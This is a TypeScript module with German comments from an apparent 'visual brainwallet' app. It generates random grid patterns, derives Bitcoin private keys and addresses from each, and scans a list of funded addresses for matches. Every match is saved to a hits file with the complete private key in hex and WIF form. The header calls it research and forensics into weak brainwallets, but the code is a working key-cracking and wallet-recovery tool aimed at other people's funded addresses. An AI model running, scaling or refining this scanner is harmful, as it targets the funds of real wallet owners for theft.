/**
 * Offline-Muster-Scan (Research/Dokumentation)
 * =============================================
 * Generiert N zufällige Visual-Key-Muster, leitet je Muster über CL-1
 * (deriveVisualKey) alle Adressformen ab und gleicht sie OFFLINE gegen eine
 * vom Nutzer bereitgestellte Liste funded BTC-Adressen ab
 * (funded-set/btcadresseswithbalance.txt im App-Datenordner).
 *
 * Architektur (speicherschonend & exakt):
 *   1. Generierungs-Phase: N Muster → Adress→Muster-Index im RAM (~100 MB
 *      bei 100k Mustern). Nur die Zellen werden je Muster behalten; das
 *      vollständige Schlüsselmaterial wird bei einem Treffer nachgerechnet.
 *   2. Scan-Phase: die (u. U. mehrere GB große) Adressdatei wird EINMAL
 *      gestreamt; jede Zeile wird gegen den Adress-Index geprüft. Exakt,
 *      keine False Positives, unabhängig von der Dateigröße.
 *
 * Treffer (Muster kollidiert mit einer funded Adresse) werden mit komplettem
 * Schlüsselmaterial gespeichert (funded-set/hits/) und im Status gehalten.
 *
 * NUR für legale Research-/Forensik-Dokumentation: der Zweck ist, die
 * Kollisions-/Angreifbarkeit schwacher „Visual Brainwallets" messbar zu
 * belegen. Die Trefferwahrscheinlichkeit gegen fremde funded Adressen ist
 * praktisch null.
 */

import { createReadStream, existsSync } from "fs";
import { mkdir, appendFile, writeFile } from "fs/promises";
import { createInterface } from "readline";
import { deriveVisualKey, type VisualKeyResult } from "./visual-key";
import { getFundedSetFile, getScanHitsDir } from "./data-dir";

export type ScanPhase = "idle" | "generating" | "scanning" | "done" | "stopped" | "error";

export interface ScanHit {
  matchedAddress: string;
  matchedType: string;
  /** Reststring der Adresszeile aus der Datei (i. d. R. der Guthaben-Wert). */
  fileBalanceRaw?: string;
  size: number;
  cells: number[];
  privateKeyHex: string;
  wifCompressed: string;
  wifUncompressed: string;
  publicKeyCompressed: string;
  addresses: {
    p2pkh: string;
    p2pkhUncompressed: string;
    p2shP2wpkh: string;
    p2wpkh: string;
  };
  foundAt: string;
}

export interface ScanState {
  phase: ScanPhase;
  target: number;
  generated: number;
  addressesIndexed: number;
  fileLines: number;
  hits: ScanHit[];
  startedAt: number;
  finishedAt?: number;
  error?: string;
  size: number;
  sourceFile: string;
  hitsFile?: string;
}

// Modul-global: überlebt einzelne Requests im selben Serverprozess.
const g = global as unknown as { __forensScan?: { state: ScanState | null; stop: boolean } };
if (!g.__forensScan) g.__forensScan = { state: null, stop: false };

export function getScanState(): ScanState | null {
  return g.__forensScan!.state;
}

export function requestScanStop(): void {
  g.__forensScan!.stop = true;
}

function isRunning(): boolean {
  const s = g.__forensScan!.state;
  return !!s && (s.phase === "generating" || s.phase === "scanning");
}

function randomPattern(size: number): number[] {
  const n = size * size;
  const density = 0.12 + Math.random() * 0.45; // 12–57 % gefüllt
  const cells = new Array<number>(n).fill(0);
  for (let i = 0; i < n; i++) {
    if (Math.random() < density) cells[i] = 1 + ((Math.random() * 3) | 0); // 1..3
  }
  return cells;
}

function typeOf(result: VisualKeyResult, addr: string): string {
  const a = result.addresses;
  if (addr === a.p2pkh) return "p2pkh";
  if (addr === a.p2pkhUncompressed) return "p2pkh-uncompressed";
  if (addr === a.p2shP2wpkh) return "p2sh-p2wpkh";
  if (addr === a.p2wpkh) return "p2wpkh";
  return "unknown";
}

const yieldToLoop = () => new Promise<void>((r) => setImmediate(r));

/**
 * Startet einen Scan im Hintergrund (nicht awaited). Wirft nur bei
 * unmittelbaren Vorbedingungsfehlern (Scan läuft schon / Datei fehlt).
 */
export function startScan(opts: { count: number; size: 8 | 12 | 16 }): void {
  if (isRunning()) throw new Error("Es läuft bereits ein Scan.");
  const sourceFile = getFundedSetFile();
  if (!existsSync(sourceFile)) {
    throw new Error(
      `Adressdatei nicht gefunden: ${sourceFile}. Bitte btcadresseswithbalance.txt in den funded-set-Ordner legen.`
    );
  }
  const size = opts.size;
  const target = Math.max(1, Math.min(Math.floor(opts.count) || 0, 5_000_000));

  g.__forensScan!.stop = false;
  g.__forensScan!.state = {
    phase: "generating",
    target,
    generated: 0,
    addressesIndexed: 0,
    fileLines: 0,
    hits: [],
    startedAt: Date.now(),
    size,
    sourceFile,
  };

  void run(target, size, sourceFile);
}

async function run(target: number, size: 8 | 12 | 16, sourceFile: string) {
  const state = g.__forensScan!.state!;
  try {
    // Trefferdatei vorbereiten
    const hitsDir = getScanHitsDir();
    await mkdir(hitsDir, { recursive: true });
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    const hitsFile = `${hitsDir}/scan-${stamp}.jsonl`;
    state.hitsFile = hitsFile;

    // ── Phase 1: Muster generieren + Adress-Index aufbauen ──
    const cellsByIdx: Uint8Array[] = [];
    const addrIndex = new Map<string, number>();

    for (let i = 0; i < target; i++) {
      if (g.__forensScan!.stop) return finalizeStopped();
      const cells = randomPattern(size);
      const result = deriveVisualKey({ size, cells });
      const idx = cellsByIdx.length;
      cellsByIdx.push(Uint8Array.from(cells));
      const a = result.addresses;
      for (const addr of [a.p2pkh, a.p2pkhUncompressed, a.p2shP2wpkh, a.p2wpkh]) {
        if (!addrIndex.has(addr)) addrIndex.set(addr, idx);
      }
      state.generated = i + 1;
      if (i % 500 === 0) await yieldToLoop();
    }
    state.addressesIndexed = addrIndex.size;

    // ── Phase 2: Adressdatei einmal streamen ──
    state.phase = "scanning";
    const rl = createInterface({
      input: createReadStream(sourceFile, { encoding: "utf8" }),
      crlfDelay: Infinity,
    });

    let lines = 0;
    for await (const line of rl) {
      if (g.__forensScan!.stop) {
        rl.close();
        return finalizeStopped();
      }
      lines++;
      const trimmed = line.trim();
      if (trimmed) {
        const parts = trimmed.split(/[\s,;]+/);
        const addr = parts[0];
        const idx = addrIndex.get(addr);
        if (idx !== undefined) {
          const cells = Array.from(cellsByIdx[idx]);
          const result = deriveVisualKey({ size, cells });
          const hit: ScanHit = {
            matchedAddress: addr,
            matchedType: typeOf(result, addr),
            fileBalanceRaw: parts.length > 1 ? parts.slice(1).join(" ") : undefined,
            size,
            cells,
            privateKeyHex: result.privateKeyHex,
            wifCompressed: result.wifCompressed,
            wifUncompressed: result.wifUncompressed,
            publicKeyCompressed: result.publicKeyCompressed,
            addresses: result.addresses,
            foundAt: new Date().toISOString(),
          };
          state.hits.push(hit);
          await appendFile(hitsFile, JSON.stringify(hit) + "\n", "utf8");
        }
      }
      if (lines % 100_000 === 0) {
        state.fileLines = lines;
        await yieldToLoop();
      }
    }
    state.fileLines = lines;

    // Sitzungs-Zusammenfassung schreiben
    await writeFile(
      `${hitsFile.replace(/\.jsonl$/, "")}-summary.json`,
      JSON.stringify(
        {
          startedAt: new Date(state.startedAt).toISOString(),
          finishedAt: new Date().toISOString(),
          patternsGenerated: state.generated,
          addressesIndexed: state.addressesIndexed,
          fileLinesScanned: state.fileLines,
          hitCount: state.hits.length,
          gridSize: size,
          sourceFile,
        },
        null,
        2
      ),
      "utf8"
    );

    state.phase = "done";
    state.finishedAt = Date.now();
  } catch (e) {
    state.phase = "error";
    state.error = e instanceof Error ? e.message : String(e);
    state.finishedAt = Date.now();
  }
}

function finalizeStopped() {
  const state = g.__forensScan!.state;
  if (state) {
    state.phase = "stopped";
    state.finishedAt = Date.now();
  }
}
